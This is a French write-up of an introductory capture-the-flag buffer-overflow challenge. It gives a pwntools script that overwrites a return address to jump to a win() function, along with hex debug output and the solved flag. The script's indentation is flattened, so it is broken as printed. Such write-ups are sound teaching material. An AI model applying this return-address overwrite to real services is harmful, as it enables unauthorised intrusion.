
---
# Description du challenge : 

## BOF win()

### 150

Conçu par Oblivios

Voici ma fonction win() qui te donnes un shell, seras-tu capable de la call ? :D

`Connexion: nc intro.ctfrei.fr 7005`

--- 


> Je télécharge le fichier et quand je me connecte sur le nc j'ai ce message : 

```shell
[Oct 03, 2024 - 16:38:24 (CEST)] exegol-EthicalHacking / #  nc intro.ctfrei.fr 7005
Tu as un buffer à overflow et une fonction win() à appeler (bon faut réussir à trouver son adresse...).
Attention, si tu compiles le challenge en local, l'adresse win() sera différente de celle en remote.
Tiens, prends ton shell:
```

> Donc je vais chercher l'addresse mémoire de win dans le fichier téléchargé : 

```shell
[Oct 03, 2024 - 16:36:46 (CEST)] exegol-EthicalHacking / # objdump -d chall | grep '<win>'
08049254 <win>:
```

> Je connais l'addresse, j'ouvres le fichier avec ghidra :

![[Pasted image 20241003164132.png]]

> Il y a plusieurs fonctions : vuln_function, win, open_flag a chaque fois le buffer est de 64 ou 68 characteres donc j'ai juste a creer mon payload : 

```python
from pwn import *

context.log_level = 'debug'

r = remote('intro.ctfrei.fr', 7005)

win_addr = 0x08049254 

for buffer_size in [64, 68, 72, 76]:

r = remote('intro.ctfrei.fr', 7005)

payload = b'A' * buffer_size

payload += p32(win_addr)

r.recvuntil(b'shell:')

r.sendline(payload)

print(f"Essai avec buffer_size = {buffer_size}")

print(r.recvall(timeout=10).decode())

r.close()

  
print("Si aucun des essais ci-dessus n'a fonctionné, essayez ceci :")

r = remote('intro.ctfrei.fr', 7005)

r.recvuntil(b'shell:')

r.sendline(b'A' * 72 + p32(win_addr))

r.interactive()
```

> J'execute le script : 

```shell 
[+] Opening connection to intro.ctfrei.fr on port 7005: Done
[DEBUG] Received 0xeb bytes:
    00000000  54 75 20 61  73 20 75 6e  20 62 75 66  66 65 72 20  │Tu a│s un│ buf│fer │
    00000010  c3 a0 20 6f  76 65 72 66  6c 6f 77 20  65 74 20 75  │·· o│verf│low │et u│
    00000020  6e 65 20 66  6f 6e 63 74  69 6f 6e 20  77 69 6e 28  │ne f│onct│ion │win(│
    00000030  29 20 c3 a0  20 61 70 70  65 6c 65 72  20 28 62 6f  │) ··│ app│eler│ (bo│
    00000040  6e 20 66 61  75 74 20 72  c3 a9 75 73  73 69 72 20  │n fa│ut r│··us│sir │
    00000050  c3 a0 20 74  72 6f 75 76  65 72 20 73  6f 6e 20 61  │·· t│rouv│er s│on a│
    00000060  64 72 65 73  73 65 2e 2e  2e 29 2e 0a  41 74 74 65  │dres│se..│.).·│Atte│
    00000070  6e 74 69 6f  6e 2c 20 73  69 20 74 75  20 63 6f 6d  │ntio│n, s│i tu│ com│
    00000080  70 69 6c 65  73 20 6c 65  20 63 68 61  6c 6c 65 6e  │pile│s le│ cha│llen│
    00000090  67 65 20 65  6e 20 6c 6f  63 61 6c 2c  20 6c 27 61  │ge e│n lo│cal,│ l'a│
    000000a0  64 72 65 73  73 65 20 77  69 6e 28 29  20 73 65 72  │dres│se w│in()│ ser│
    000000b0  61 20 64 69  66 66 c3 a9  72 65 6e 74  65 20 64 65  │a di│ff··│rent│e de│
    000000c0  20 63 65 6c  6c 65 20 65  6e 20 72 65  6d 6f 74 65  │ cel│le e│n re│mote│
    000000d0  2e 0a 54 69  65 6e 73 2c  20 70 72 65  6e 64 73 20  │.·Ti│ens,│ pre│nds │
    000000e0  74 6f 6e 20  73 68 65 6c  6c 3a 20                  │ton │shel│l: │
    000000eb
[DEBUG] Sent 0x51 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  41 41 41 41  41 41 41 41  41 41 41 41  54 92 04 08  │AAAA│AAAA│AAAA│T···│
    00000050  0a                                                  │·│
    00000051
Essai avec buffer_size = 76
[+] Receiving all data: Done (56B)
[DEBUG] Received 0x1e bytes:
    00000000  42 69 65 6e  20 6a 6f 75  c3 a9 2c 20  74 75 20 61  │Bien│ jou│··, │tu a│
    00000010  73 20 63 61  6c 6c 20 77  69 6e 28 29  21 0a        │s ca│ll w│in()│!·│
    0000001e
[DEBUG] Received 0x19 bytes:
    b'Flag: CTFREI{b0f_t0_w1n}\n'
[*] Closed connection to intro.ctfrei.fr port 7005
 Bien joué, tu as call win()!
Flag: CTFREI{b0f_t0_w1n}
```

# Résultat : 

> Flag: CTFREI{b0f_t0_w1n}

